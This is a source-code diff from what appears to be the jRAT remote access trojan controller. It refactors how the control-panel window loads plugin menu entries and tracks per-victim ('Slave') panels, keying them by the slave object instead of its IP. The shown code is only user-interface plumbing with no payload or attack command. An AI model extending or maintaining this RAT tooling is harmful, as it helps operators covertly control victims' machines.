@@ -35,11 +35,9 @@ import javax.swing.tree.DefaultTreeModel;
 
 import jrat.api.BaseControlPanel;
 import jrat.api.RATControlMenuEntry;
-import jrat.api.RATPlugin;
 import se.jrat.common.script.Script;
 import se.jrat.controller.Constants;
 import se.jrat.controller.Slave;
-import se.jrat.controller.addons.Plugins;
 import se.jrat.controller.addons.RATObjectFormat;
 import se.jrat.controller.exceptions.ControlPanelLoadException;
 import se.jrat.controller.listeners.Performable;
@@ -116,10 +114,8 @@ public class FrameControlPanel extends BaseFrame {
 
 	public void loadItems() {
 		if (entries.size() == 0) {
-			for (RATPlugin p : Plugins.getPlugins()) {
-				for (RATControlMenuEntry entry : p.getControlTreeItems()) {
-					entries.add(entry);
-				}
+			for (RATControlMenuEntry entry : RATControlMenuEntry.getEntries()) {
+				entries.add(entry);
 			}
 		}
 	}
@@ -132,13 +128,13 @@ public class FrameControlPanel extends BaseFrame {
 			public void windowClosing(WindowEvent arg0) {
 				for (RATControlMenuEntry entry : entries) {
 					try {
-						BaseControlPanel panel = entry.instances.get(slave.getIP());
+						BaseControlPanel panel = entry.getInstances().get(slave);
 						
 						if (panel != null) {
 							panel.onClose();
 						}
 						
-						entry.instances.remove(slave.getIP());
+						entry.getInstances().remove(slave);
 					} catch (Exception e) {
 						e.printStackTrace();
 					}
@@ -410,13 +406,13 @@ public class FrameControlPanel extends BaseFrame {
 			tabbedPane.removeAll();
 			tabbedPane.addTab("View Installed Plugins", i.get("view installed plugins"), panels.get("view installed plugins"));
 
-			ImageIcon def = i.get("plugins");
+			ImageIcon defaultIcon = i.get("plugins");
 			for (RATControlMenuEntry entry : entries) {
 				try {
 					BaseControlPanel panel = entry.newPanelInstance(RATObjectFormat.format(slave));
 					panel.onLoad();
-					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? def : entry.getIcon(), panel);
-					entry.instances.put(slave.getIP(), panel);
+					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? defaultIcon : entry.getIcon(), panel);
+					entry.getInstances().put(slave, panel);
 				} catch (Exception ex) {
 					ex.printStackTrace();
 				}
